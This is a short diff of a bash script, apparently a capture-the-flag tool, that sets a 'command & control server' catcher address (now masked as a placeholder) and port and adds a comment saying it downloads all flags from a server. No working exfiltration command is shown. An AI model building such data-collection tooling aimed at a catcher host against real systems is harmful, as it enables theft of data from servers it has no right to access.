@@ -1,6 +1,7 @@
 #!/bin/bash
+# downloads all the flags from exvery spot on a server
 # command & control server
-CATCHER=192.168.11.135
+CATCHER=192.168.11.XXX
 CP=1234
 # time to quit
 I=1
